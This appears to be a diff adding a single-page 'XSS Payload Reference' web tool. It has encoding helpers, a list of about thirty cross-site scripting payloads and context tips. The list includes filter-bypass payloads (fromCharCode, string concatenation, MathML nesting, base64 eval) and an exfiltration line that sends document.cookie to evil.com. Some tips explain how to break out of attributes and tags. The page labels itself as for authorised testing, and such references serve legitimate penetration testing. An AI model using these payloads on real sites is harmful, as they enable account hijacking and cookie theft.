@@ -1,0 +1,148 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>XSS Tester</title>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:'Inter',sans-serif;background:#f5f5f5;color:#333}
+.header{background:#fff;padding:16px 24px;box-shadow:0 2px 8px rgba(0,0,0,.08);display:flex;align-items:center;gap:12px;position:sticky;top:0;z-index:10}
+.header a{color:#FF6B00;text-decoration:none;font-weight:600}
+.header h1{font-size:20px;font-weight:700}
+.header .icon{font-size:24px}
+.container{max-width:900px;margin:24px auto;padding:0 16px}
+.card{background:#fff;border-radius:12px;padding:24px;margin-bottom:20px;box-shadow:0 2px 8px rgba(0,0,0,.06)}
+.card h2{font-size:16px;font-weight:600;margin-bottom:12px}
+textarea{width:100%;height:100px;border:1px solid #e0e0e0;border-radius:8px;padding:12px;font-family:monospace;font-size:13px;resize:vertical}
+textarea:focus{outline:2px solid #FF6B00;border-color:#FF6B00}
+.btn{background:#FF6B00;color:#fff;border:none;padding:10px 20px;border-radius:8px;font-family:'Inter';font-weight:600;font-size:14px;cursor:pointer}
+.btn:hover{opacity:.9}
+.btn-secondary{background:#eee;color:#333}
+.btn-sm{padding:6px 12px;font-size:12px}
+.btn-row{display:flex;gap:8px;flex-wrap:wrap;margin:12px 0}
+.alert{background:#fff3cd;border:1px solid #ffc107;border-radius:8px;padding:12px;font-size:13px;margin-bottom:12px}
+.alert strong{color:#856404}
+.payload-list{max-height:400px;overflow-y:auto}
+.payload-item{background:#f8f8f8;border-radius:6px;padding:10px;margin:6px 0;font-family:monospace;font-size:12px;display:flex;justify-content:space-between;align-items:center;gap:8px}
+.payload-item code{flex:1;word-break:break-all}
+.tag{display:inline-block;background:#FF6B00;color:#fff;padding:2px 8px;border-radius:10px;font-size:10px;font-weight:600}
+.tag.html{background:#3498db}.tag.js{background:#e74c3c}.tag.attr{background:#9b59b6}.tag.svg{background:#27ae60}
+.preview-box{background:#f8f8f8;border:1px solid #ddd;border-radius:8px;padding:16px;min-height:60px;margin-top:8px}
+.toast{position:fixed;bottom:24px;right:24px;background:#333;color:#fff;padding:12px 20px;border-radius:8px;font-size:14px;z-index:1000;opacity:0;transition:opacity .3s}
+.toast.show{opacity:1}
+</style>
+</head>
+<body>
+<div class="header"><a href="/">← Home</a><span class="icon">🛡️</span><h1>XSS Payload Reference</h1></div>
+<div class="container">
+<div class="alert"><strong>⚠️ Educational Tool Only.</strong> Use only on systems you own or have explicit permission to test. Never use XSS payloads maliciously.</div>
+<div class="card">
+<h2>Custom Payload</h2>
+<textarea id="customPayload" placeholder="Enter or paste an XSS payload..."></textarea>
+<div class="btn-row">
+<button class="btn btn-sm" onclick="encodeHtml()">HTML Encode</button>
+<button class="btn btn-sm btn-secondary" onclick="decodeHtml()">HTML Decode</button>
+<button class="btn btn-sm btn-secondary" onclick="encodeJs()">JS Escape</button>
+<button class="btn btn-sm btn-secondary" onclick="copy(customPayload)">📋 Copy</button>
+</div>
+<textarea id="encodedOutput" readonly placeholder="Encoded output..." style="height:60px"></textarea>
+</div>
+<div class="card">
+<h2>Payload Reference</h2>
+<div class="btn-row">
+<button class="btn btn-sm btn-secondary filter active" data-f="all">All</button>
+<button class="btn btn-sm btn-secondary filter" data-f="html">HTML</button>
+<button class="btn btn-sm btn-secondary filter" data-f="js">JavaScript</button>
+<button class="btn btn-sm btn-secondary filter" data-f="attr">Attribute</button>
+<button class="btn btn-sm btn-secondary filter" data-f="svg">SVG</button>
+</div>
+<div class="payload-list" id="payloadList"></div>
+</div>
+<div class="card">
+<h2>Context Helper</h2>
+<p style="font-size:13px;color:#666;margin-bottom:8px">Select the context to see recommended payloads and encoding:</p>
+<select id="context" onchange="showContext()" style="width:100%;padding:10px;border:1px solid #e0e0e0;border-radius:8px;font-size:14px">
+<option value="">Select context...</option>
+<option value="html-body">HTML Body (inside tag content)</option>
+<option value="html-attr">HTML Attribute (inside quotes)</option>
+<option value="js-string">JavaScript String</option>
+<option value="js-template">JavaScript Template Literal</option>
+<option value="css">CSS Style</option>
+<option value="url">URL Parameter</option>
+<option value="meta">Meta/Title Tag</option>
+</select>
+<div class="preview-box" id="contextInfo">Select a context above to see information.</div>
+</div>
+</div>
+<div id="toast" class="toast"></div>
+<script>
+const customPayload=document.getElementById('customPayload');
+function toast(msg){const t=document.getElementById('toast');t.textContent=msg;t.classList.add('show');setTimeout(()=>t.classList.remove('show'),2000)}
+function copy(el){if(typeof el==='string')navigator.clipboard.writeText(el);else navigator.clipboard.writeText(el.value).then(()=>toast('Copied!'))}
+function encodeHtml(){const v=customPayload.value;document.getElementById('encodedOutput').value=v.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;').replace(/'/g,'&#x27;')}
+function decodeHtml(){const v=customPayload.value;const el=document.createElement('textarea');el.innerHTML=v;document.getElementById('encodedOutput').value=el.value}
+function encodeJs(){const v=customPayload.value;document.getElementById('encodedOutput').value=v.split('').map(c=>'\\x'+c.charCodeAt(0).toString(16).padStart(2,'0')).join('')}
+const payloads=[
+{code:'<script>alert(1)</script>',type:'html',desc:'Basic script injection'},
+{code:'<img src=x onerror="alert(1)">',type:'html',desc:'Image onerror handler'},
+{code:'<svg onload="alert(1)">',type:'svg',desc:'SVG onload event'},
+{code:'<body onload="alert(1)">',type:'html',desc:'Body onload event'},
+{code:'<iframe src="javascript:alert(1)">',type:'html',desc:'Iframe javascript URI'},
+{code:'<input onfocus="alert(1)" autofocus>',type:'attr',desc:'Input autofocus + focus event'},
+{code:'<details open ontoggle="alert(1)">',type:'html',desc:'Details toggle event'},
+{code:'<marquee onstart="alert(1)">',type:'html',desc:'Marquee onstart event'},
+{code:'<video><source onerror="alert(1)">',type:'html',desc:'Video source error'},
+{code:'<audio src=x onerror="alert(1)">',type:'html',desc:'Audio error event'},
+{code:'"><script>alert(1)</script>',type:'attr',desc:'Break out of attribute'},
+{code:'"><img src=x onerror=alert(1)>',type:'attr',desc:'Break out and inject img'},
+{code:'javascript:alert(1)',type:'js',desc:'JavaScript URI scheme'},
+{code:'data:text/html,<script>alert(1)</script>',type:'js',desc:'Data URI scheme'},
+{code:'eval(String.fromCharCode(97,108,101,114,116,40,49,41))',type:'js',desc:'String.fromCharCode bypass'},
+{code:'window["al"+"ert"](1)',type:'js',desc:'String concatenation bypass'},
+{code:'document["write"]("<scr"+"ipt>alert(1)</scr"+"ipt>")',type:'js',desc:'Document write bypass'},
+{code:'throw onerror=alert,1',type:'js',desc:'Error handler trick'},
+{code:'<svg><script>alert&#40;1&#41;</script></svg>',type:'svg',desc:'SVG with HTML entities'},
+{code:'<svg/onload=alert(1)>',type:'svg',desc:'SVG no space bypass'},
+{code:'<math><mtext><table><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(1) src=x>">',type:'svg',desc:'MathML nesting trick'},
+{code:'"><a href="data:text/html,<script>alert(1)</script>">Click</a>',type:'attr',desc:'Data URI link'},
+{code:"'-alert(1)-'",type:'js',desc:'JS template expression'},
+{code:'{{7*7}}',type:'html',desc:'Template injection (SSTI)'},
+{code:'${7*7}',type:'js',desc:'Template literal injection'},
+{code:'-alert(1)-',type:'js',desc:'Math negation trick'},
+{code:'alert(document.cookie)',type:'js',desc:'Cookie stealing (demo)'},
+{code:'"><svg/onload=fetch("//evil.com/"+document.cookie)>',type:'attr',desc:'Exfiltration payload'},
+{code:'<img src=x onerror="eval(atob(`YWxlcnQoMSk=`))">)',type:'html',desc:'Base64 encoded payload'},
+];
+let currentFilter='all';
+document.querySelectorAll('.filter').forEach(b=>{
+b.addEventListener('click',function(){
+document.querySelectorAll('.filter').forEach(x=>x.classList.remove('active'));
+this.classList.add('active');
+currentFilter=this.dataset.f;
+renderPayloads();
+});
+});
+function renderPayloads(){
+const filtered=currentFilter==='all'?payloads:payloads.filter(p=>p.type===currentFilter);
+document.getElementById('payloadList').innerHTML=filtered.map(p=>`<div class="payload-item"><span class="tag ${p.type}">${p.type}</span><code>${p.code.replace(/</g,'&lt;').replace(/>/g,'&gt;')}</code><button class="btn btn-sm" onclick="copy(this.previousElementSibling.textContent)" style="flex-shrink:0">📋</button></div><div style="font-size:11px;color:#666;padding:0 4px 4px 40px">${p.desc}</div>`).join('');
+}
+const contexts={
+'html-body':{title:'HTML Body Context',info:'Your input is rendered as HTML. Any tags will be interpreted.',tips:['Use HTML encoding: &lt; → &amp;lt;','Block specific tags with a whitelist','Use CSP headers']},
+'html-attr':{title:'HTML Attribute Context',info:'Your input is inside an HTML attribute value (usually quoted).',tips:['Break out of quotes: " or \'','Use HTML entity encoding','Avoid inline event handlers']},
+'js-string':{title:'JavaScript String Context',info:'Your input is inside a JS string literal.',tips:['Escape: \\, \\x27, \\u0027','Use JSON encoding','Avoid innerHTML']},
+'js-template':{title:'Template Literal Context',info:'Your input is inside backticks (template literal).',tips:['Escape backticks: \\`','Avoid ${} expressions','Use textContent not innerHTML']},
+'css':{title:'CSS Context',info:'Your input is inside a style attribute or stylesheet.',tips:['Escape: \\, \\00','Avoid url() with user input','Use CSS custom properties']},
+'url':{title:'URL Parameter Context',info:'Your input is in a URL query parameter.',tips:['Use URL encoding: encodeURIComponent()','Block javascript: URIs','Validate URL scheme']},
+'meta':{title:'Meta/Title Context',info:'Your input is inside <meta> or <title> tags.',tips:['Encode HTML entities','Close the tag early: </title><script>','Use Content-Security-Policy']}
+};
+function showContext(){
+const ctx=document.getElementById('context').value;
+if(!ctx){document.getElementById('contextInfo').innerHTML='Select a context above to see information.';return}
+const c=contexts[ctx];
+document.getElementById('contextInfo').innerHTML=`<h3 style="margin-bottom:8px">${c.title}</h3><p style="font-size:13px;margin-bottom:8px">${c.info}</p><ul style="font-size:13px;padding-left:20px">${c.tips.map(t=>`<li style="margin:4px 0">${t}</li>`).join('')}</ul>`;
+}
+renderPayloads();
+</script>
+</body>
+</html>
